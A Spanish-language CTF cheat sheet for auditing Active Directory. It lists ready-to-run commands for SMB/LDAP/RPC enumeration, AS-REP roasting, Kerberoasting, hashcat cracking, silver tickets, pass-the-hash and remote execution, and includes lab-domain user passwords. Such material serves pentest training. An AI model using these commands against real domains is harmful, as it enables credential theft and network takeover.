---
title: "Planilla / Checklist: Auditoría de Active Directory (CTF)"
description: "Descripcion"
date: "2024-12-01"
tags: ["Bash"]
---

# 🧭 Planilla / Checklist: Auditoría de Active Directory (CTF)

## 📋 Checklist Rápido

1. Escaneo de red y puertos
    
2. Enumeración SMB/LDAP/RPC sin credenciales
    
3. Enumeración de usuarios con Kerbrute
    
4. AS-REP Roasting attack
    
5. Kerberoasting attack
    
6. Búsqueda de GPP passwords
    
7. Movimiento lateral con credenciales obtenidas
    
8. Análisis con BloodHound
    
9. DCSync attack
    
10. Golden/Silver ticket creation
    
11. Persistencia en el dominio
    
12. Extracción de flags/evidencias
    

# 0 Metadatos del ejercicio

-  Fecha: ____ / ____ / ______
   
- NetBIOS computer name:                                                                                                          
- NetBIOS domain name:                                                                                                           
- DNS domain:                                                                                                                
- FQDN: 

- OS:  

- OS version: 
   
-  Credenciales iniciales (si hay):

-  usuario

-  pass  

-  NTLM: 
   
-  Objetivo del reto: (flag / DA / DCSync / secreta) _______________________
  

---

### ⚠️ Crear estructura de directorios

- Estructura Pentesting en AD.

```bash

#!/bin/bash
# Script para crear estructura de carpetas para CTF/pentesting

# Colores para mensajes
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # Sin color

# Directorios principales y subdirectorios
declare -A dirs=(
    ["scans"]="nmap smb ldap kerberos"
    ["loot"]="hashes credentials bloodhound"
)

echo -e "${GREEN}Creando estructura de carpetas...${NC}"

# Crear directorios
for parent in "${!dirs[@]}"; do
    for sub in ${dirs[$parent]}; do
        dir_path="$parent/$sub"
        if [ ! -d "$dir_path" ]; then
            mkdir -p "$dir_path"
            echo -e "${GREEN}✔ Creado: $dir_path${NC}"
        else
            echo -e "${YELLOW}⚠ Ya existe: $dir_path${NC}"
        fi
    done
done

echo -e "${GREEN}Estructura de carpetas lista ✅${NC}"

```

# 1️ Reconocimiento de Red

### 💻 Nmap


- Host discovery

```bash

nmap -sSCV -p- --open -T4 -vvv -n -Pn -oG victimPorts <IP>

```

*Podemos usar el script de Savitar para ,mayor comodidad*

```
#!/bin/bash

# Usage:
# chmod +x extractPorts.sh
# ./extractPorts.sh victimPorts

function extractPorts(){
        
        if [ -z "$1" ]; then
                echo "Usage: extractPorts.sh <filename>"
                return 1
        fi

        
        if [ ! -f "$1" ]; then
                echo "File $1 not found"
                return 1
        fi

        
        if ! grep -qE '^[^#].*/open/' "$1"; then
                echo "Format Invalid: Use -oG <file>, in nmap for a correct format."
                return 1
        fi

        ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')";
        ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
        echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
        echo -e "\t[*] IP Address: $ip_address"  >> extractPorts.tmp
        echo -e "\t[*] Open ports: $ports\n"  >> extractPorts.tmp
        echo $ports | tr -d '\n' | xclip -selection clipboard
        echo -e "[*] Ports copied to clipboard\n"  >> extractPorts.tmp
        cat extractPorts.tmp; rm extractPorts.tmp
}
extractPorts "$1"

```


-  Puertos AD críticos

```bash

nmap -sSCV -p<puertos abiertos> -T3 -Pn -n -vvv -oN escaneo_nmap.txt -oX escaneo_nmap.xml <IP>

```

*Convertir xml a html*

```
xsltproc escaneo_nmap.xml -o target.html
```



- Identificación del DC:

```bash

nmap -p 88,389,445 --script krb5-enum-users,ldap-rootdse,smb-os-discovery <IP>

```



-  HTTP/WEB quick-fingerprint
    

```bash

whatweb http://<IP> ; whatweb https://<IP>

```


 Hosts vivos: ...
 Servicios clave por IP: ...

---

# 2 Enumeración de Usuarios y Recursos

- Importante: Cada vez que se encuentre un nuevo usuario o contraseña se volverá a enumerar recursos con la nueva información.

*REVISAR  🔎 Enumeración sin credenciales*

```bash

sudo netexec smb <IP> -u "" -p "" --shares

sudo netexec smb <IP> -u "" -p "" --users

sudo smbclient //<IP>/<RECURSO> -N -c 'ls; mget *'


smbclient -N -L //<IP>

enum4linux-ng <IP>

smbmap -H <IP> -r <RECURSO>

crackmapexec smb <IP> -u guest -p '' --shares

# Recursividad
crackmapexec smb <IP> -u "<USER>" -p '<PASS>' --spider <RECURSO> --pattern .

# Descargar data
crackmapexec smb <IP> -u "<USER>" -p '<PASS>' --share <RECURSO> --get-file <file> <newfile>

smbmap -H <IP>

smbclient -L //<IP> -N

rpcclient -U "" -N <IP>

```

```bash

kerbrute userenum -d dominio.local users.txt --dc <IP>

kerbrute userenum -d dominio.local --dc 10.10.10.100 users.txt 

```


## 🔎 Enumeración SMB / NetBIOS


## 1️⃣ Sesión nula (sin credenciales)

### 🔍 Listar shares


```bash

# netexec / crackmapexec 

sudo netexec smb <IP> -u "" -p "" --shares 
crackmapexec smb <IP> --shares -u '' -p '' 
 
# smbclient 

smbclient -L //<IP> -N  

# smbmap 

smbmap -H <IP> 
smbmap -H <IP> -u "" -p ""

```




### 📂 Acceder a shares públicos

```bash

# Acceso directo a un share anónimo 

smbclient //<IP>/<SHARE> -N

```



### 👥 Enumeración de usuarios/grupos

```bash

# netexec 

sudo netexec smb <IP> -u "" -p "" --users

```

### 📌 Acceso a carpetas de sistema (si están abiertas anónimamente)

```bash

smbclient //<DC_HOST>/SYSVOL -N 
smbclient //<DC_HOST>/NETLOGON -N

```

---

## 2️⃣ Con credenciales

### 🔍 Listar shares

```bash

# crackmapexec / netexec 

sudo netexec smb <IP> -u "usuario" -p "password" --shares
  
# smbclient 

smbclient -L //<IP> -U usuario 
smbclient -L //<IP> -U guest% 


# smbmap 

smbmap -H <IP> -u usuario -p password

```


### 📂 Acceder a un recurso


## smbclient

```bash

# Acceder sin credenciales (sesión nula) 

smbclient //<IP>/<SHARE> -N  

# Acceder con usuario/contraseña 

smbclient //<IP>/<SHARE> -U usuario  

# Acceder con dominio 

smbclient //<IP>/<SHARE> -U DOMINIO/usuario%password
```


### 💾 Descargar archivos

- Comandos para descargar contenido (Distintos tipos de usuarios tendran distintos tipos de privilegios)


```bash
smb: \> ls                       # lista archivos en el share
smb: \> lcd /home/user/descargas # carpeta local donde guardar archivos
smb: \> mask ""                   # opcional: filtro de archivos
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
smb: \> get archivo.txt           # descargar archivo específico
smb: \> exit                      # salir del prompt

```

---


## 2️⃣ smbmap

```bash

# Acceder y listar contenido del share (recursivo) 

smbmap -H <IP> -u usuario -p password -r <SHARE>  

# Descargar archivo específico 

smbmap -H <IP> -u usuario -p password --download "C$/Users/Administrador/Desktop/flag.txt"

```

---

## 3️⃣ CrackMapExec / NetExec

```bash

# Enumerar y probar acceso al share 

crackmapexec smb <IP> -u usuario -p password --shares  


```

---

## 4️⃣ mount.cifs (Linux)

```bash
# Montar un recurso SMB en /mnt/smb 

sudo mount -t cifs //<IP>/<SHARE> /mnt/smb -o username=usuario,password=pass  

# Montar en modo anónimo 

sudo mount -t cifs //<IP>/<SHARE> /mnt/smb -o guest

```
---


### 📌 Acceso a carpetas de sistema (SYSVOL / NETLOGON)

```bash

smbclient //<DC_HOST>/SYSVOL -U usuario 

smbclient //<DC_HOST>/NETLOGON -U usuario

```


6️⃣ Notas y evidencia


- Shares accesibles: 

- Usuarios extraídos: 

- Archivos importantes encontrados: 


---

## 🔎 Enumeración LDAP

- Enumerar **todos los usuarios del dominio** `fluffy.htb`.
    
- Obtener su **nombre completo** (`cn`) y su **nombre de inicio de sesión** (`sAMAccountName`).
    
- Sirve para **pentesting / auditoría**, porque te da un **mapa de cuentas existentes en AD**, que luego puede usarse en pruebas de fuerza bruta o Kerberos.


- NXC

```bash

nxc ldap <IP> -u USERNAME -p PASS --users

nxc ldap <IP> -u USERNAME -p PASS --query "(sAMAccountName=ca_svc)" ""   

nxc ldap <IP> -u USERNAME -p PASS --bloodhound --collection All --dns-server <IP>

nxc ldap <IP> -u USERNAME -p PASS -M groupmembership -o USER="USERNAME"

```


```bash

# LDAP sin autenticación:

ldapsearch -x -H ldap://<IP> -b "dc=dominio,dc=local"


# LDAP con credenciales:

ldapsearch -x -H ldap://10.10.11.69 -D "j.fleischman@fluffy.htb" -w 'J0elTHEM4n1990!' -b "dc=fluffy,dc=htb"


```

-  LDAP anónimo (base y namingContext)
    

```bash

ldapsearch -x -H ldap://<DC_IP> -s base -b "" "(objectClass=*)"

ldapsearch -x -H ldap://<DC_IP> -b "DC=<dominio>,DC=<tld>" "(objectClass=user)" cn sAMAccountName

ldapsearch -x -H ldap://<IP> -b "dc=dom,dc=local" "(objectClass=user)" sAMAccountName

```

- LDAP con credenciales


```bash

ldapsearch -x -H ldap://<DC_IP> -D "<usuario>@<dominio>" -w '<contraseña>' -s base -b "" "(objectClass=*)"

ldapsearch -x -H ldap://<DC_IP> -D "<usuario>@<dominio>" -w '<contraseña>' -b "DC=<dominio>,DC=<tld>" "(objectClass=user)" cn sAMAccountName

ldapsearch -x -H ldap://<IP> -D "<usuario>@<dominio>" -w '<contraseña>' -b "dc=dom,dc=local" "(objectClass=user)" sAMAccountName


```


-  Listado vía Windapsearch / ldeep (si disponible)
    

```bash

python3 windapsearch.py -d <DOMINIO.LOCAL> -u '' -p '' --dc-ip <DC_IP> --attributes sAMAccountName,memberOf

```

-  DNS AD (si expuesto)
    

```bash

adidnsdump -d <DOMINIO.LOCAL> -s <DC_IP>

```




**Notas/Evidencia:**


- Base DN: ...
- Usuarios/Grupos: ...


---

## 🔎 Enumeración RPC

Comandos RPC

```bash

# Conectarse a un recurso compartido en sesión nula 

rpcclient -U "" <IP>  

# Con usuario

rpcclient -U "usuario%password" <IP>

```

Algunos comandos útiles:

```bash

- `enumdomusers` Enumerar usuarios del dominio.
    
- `enumdomgroups` Enumerar grupos del dominio.
    
- `queryuser <RID>` Mostrar detalles de un usuario específico.
    
- `querydispinfo` Listar usuarios con información detallada (como nombres completos y comentarios).
    
- `netshareenum` Enumerar recursos compartidos.
    
- `srvinfo` Ver información general de la máquina.
  
```

---

## 🔎 Enumeración KERBEROS

-  Descubrir usuarios válidos

```bash

kerbrute userenum -d <DOMINIO.LOCAL> --dc <DC_IP> users.txt -o kerbrute_users.txt

```

-  AS-REP Roasting (usuarios sin preauth)

```bash

impacket-GetNPUsers <DOMINIO.LOCAL>/ -dc-ip <DC_IP> -no-pass -usersfile kerbrute_users.txt -outputfile asrep_hashes.txt

impacket-GetNPUsers DOM.LOCAL/ -dc-ip <DC_IP> -usersfile users.txt -outputfile hashes.txt

# Hashcat: modo 18200 (Kerberos 5 AS-REP)

hashcat -m 18200 asrep_hashes.txt rockyou.txt

```


-  Kerberoasting (cuentas con SPN)


```bash

impacket-GetUserSPNs <DOMINIO.LOCAL>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile tgs_hashes.txt

# Hashcat: modo 13100 (TGS etype23) o 19600/19800 (AES)

hashcat -m 13100 tgs_hashes.txt rockyou.txt

```

- Kerberos Attacks

```bash

# Silver Ticket

kerberos::golden /domain:dom.local /sid:S-1-5-21-... /rc4:<NTLM_SERVICE> /service:CIFS /target:SERVER /user:ADMIN /ptt

# Pass-the-Ticket

export KRB5CCNAME=/path/to/ticket.ccache

psexec.py -k -no-pass dominio.local/administrador@DC01

```


### Hashcat



|Ataque|Hashcat Mode|Hash Source|Comando|
|---|---|---|---|
|AS-REP Roasting (RC4)|`18200`|`GetNPUsers.py`|`hashcat -m 18200 asrep_hashes.txt rockyou.txt`|
|Kerberoasting (RC4)|`13100`|`GetUserSPNs.py`|`hashcat -m 13100 tgs_hashes.txt rockyou.txt`|
|Kerberoasting (AES128)|`19600`|Avanzado|`hashcat -m 19600 tgs_aes128.txt rockyou.txt`|
|Kerberoasting (AES256)|`19800`|Avanzado|`hashcat -m 19800 tgs_aes256.txt rockyou.txt`|
|NetNTLMv2 (SMB)|`5600`|SMB Relay, responder, etc.|✅ Pero **no se usa para Kerberos**|





**Notas/Evidencia:**


- Usuarios válidos: ...
- AS-REP hashes: ...
- SPNs encontrados: ...


---

## enum4linux-ng 

#### **1️⃣ Escaneo básico**

`enum4linux-ng 10.10.11.69`

- Información general: OS, shares, usuarios visibles.
    
---

#### **2️⃣ Enumerar usuarios**

`enum4linux-ng -U 10.10.11.69`

- Lista los usuarios del dominio.
    

---

#### **3️⃣ Enumerar grupos**

`enum4linux-ng -G 10.10.11.69`

- Lista los grupos del dominio.
    

---

#### **4️⃣ Enumerar shares y permisos**

`enum4linux-ng -S 10.10.11.69`

- Muestra los shares y sus permisos de acceso.
    

---

#### **5️⃣ Enumerar políticas y configuraciones**

`enum4linux-ng -P 10.10.11.69`

- Extrae políticas de contraseña y configuraciones de dominio.
    

---

#### **6️⃣ Escaneo agresivo (todas las comprobaciones)**

`enum4linux-ng -A 10.10.11.69`

- Ejecuta todos los módulos posibles.
    

---

#### **7️⃣ Usando credenciales**

- Lista los usuarios del dominio.

`enum4linux-ng -u j.fleischman -p 'J0elTHEM4n1990!' 10.10.11.69`

- Enumerar todo y guardar en un archivo


`enum4linux-ng -A -u USUARIO -p 'PASS' -v <IP> -oA enumeracion`


---


# 3 Explotación


##    BloodHound

- Pasos para usar Bloodhound en kali:


```bash

# Descargar el relese correspondiente desde https://github.com/SpecterOps/BloodHound-Legacy/releases?utm_source=chatgpt.com

# Descomprimir, entrar en la carpeta, darle permisos de ejecucion si no los tiene

./BloodHound --no-sandbox

# Se abrira la ventana web y pedira usuario = ne4j y password que sera la que nosotros pusimos en neo4j cuando nos pidio cambiar la contraseña

# Buscar en blodhound Shortest Paths to Unconstrained Delegation Systems

# Usar con usuario root si da problemas

sudo bloodhound-python -u j.fleischman -p 'J0elTHEM4n1990!' -d fluffy.htb -dc dc01.fluffy.htb -c All --zip -ns 10.10.11.69 --dns-tcp --disable-autogc

python3 bloodhound.py -u p.agila -p 'prometheusx-303' -ns 10.10.11.69 -d fluffy.htb -c all


nxc ldap dc01.fluffy.htb -u 'j.fleischman' -p '¡J0elTHEM4n1990!' --bloodhound --collection all --dns-tcp --dns-server 10.10.11.69

nxc ldap dc01.fluffy.htb -u 'j.fleischman' -p '¡J0elTHEM4n1990!' --bloodhound --collection All --dns-tcp --dns-server 10.10.11.69

nxc smb 10.10.11.69 -u 'j.fleischman' -p '¡J0elTHEM4n1990!' --bloodhound --collection All

SharpHound.exe --CollectionMethod All --ZipFileName loot.zip

bloodhound-python -d fluffy.htb -u 'j.fleischman' -p '¡J0elTHEM4n1990!' -dc dc01.fluffy.htb -c All --zip

```

-  Importar en GUI y buscar rutas:
    
    - _Shortest Paths to Domain Admins_
        
    - Objetos con `GenericAll/GenericWrite`, `AddMember`, `Owns`
        
    - Grupos privilegiados: `Domain Admins`, `Account Operators`, `Backup Operators`
        

**Notas/Evidencia:**


- Relaciones críticas: ...
- Ruta a DA: ...
---

## 🔹 Usando **SharpHound (en la máquina víctima/Windows)**

1. Subes el binario (`SharpHound.exe`):
    
    ``
    
2. Esto genera un `.zip` que puedes importar directamente en BloodHound.
    
    Opciones interesantes:
    
    - `--CollectionMethod All` → todo
        
    - `--CollectionMethod ACL,Group,Session` → personalizado
        
    - `--Stealth` → recolección mínima y más sigilosa
        

---

## 🔹 Usando **BloodHound-python** (alternativa Linux sin SharpHound)



Recolectar desde Windows:

```powershell

Import-Module .\SharpHound.ps1

Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip

```

Desde Kali:

```bash

bloodhound-python -u usuario -p contraseña -d dominio.local -dc-ip <IP> --collection ALL

```

  Recolección desde Linux
    

```bash

bloodhound-python -u <user> -p '<pass>' -d <DOMINIO.LOCAL> -ns <DC_IP> -c All -o bh

```

-  Importar en GUI y buscar rutas:
    
    - _Shortest Paths to Domain Admins_
        
    - Objetos con `GenericAll/GenericWrite`, `AddMember`, `Owns`
        
    - Grupos privilegiados: `Domain Admins`, `Account Operators`, `Backup Operators`
        

**Notas/Evidencia:**


- Relaciones críticas: ...
- Ruta a DA: ...


##    Impacket Exploits

```bash

# Pass-the-Hash

impacket-psexec dominio/usuario@10.10.11.69 -hashes LM:NT

# WMIExec

impacket-wmiexec dominio/usuario:pass@10.10.11.69

# SMBExec

impacket-smbexec dominio/usuario:pass@10.10.11.69



```

- Búsqueda de credenciales en SYSVOL/NETLOGON

```bash

smbclient //'<DC_HOST>'/SYSVOL -N

# Buscar
recurse ON
ls
# Descarga Policies/...

# Local: gpp-decrypt <cpassword>

```

-  Otros secretos (scripts, .xml, .ini, .bat)
    

```bash

find . -type f -iregex '.*\.(xml|ini|bat|ps1|vbs|txt)' -print

```

**Notas/Evidencia:**


- cpassword: ...
- credenciales encontradas: ...


---

 

## 💻 Movimiento lateral y ejecución remota



```bash

evil-winrm -i <HOST> -u <user> -p '<pass>'

evil-winrm -i <HOST> -u <user> -H <NTLM_HASH>

impacket-wmiexec <DOMINIO.LOCAL>/<user>:'<pass>'@<HOST>

impacket-psexec <DOMINIO.LOCAL>/<user>:'<pass>'@<HOST>

crackmapexec smb <IP> -u <user> -p '<pass>' --shares --sessions --disks --loggedon-users

psexec.py dominio.local/usuario:pass@<IP>

smbexec.py dominio.local/usuario:pass@<IP>

wmiexec.py dominio.local/usuario@<IP> -hashes :<NTLM>

evil-winrm -i <IP> -u usuario -p contraseña



```


**Notas/Evidencia:**


- Hosts accesibles: ...
- Comandos ejecutados: ...


---

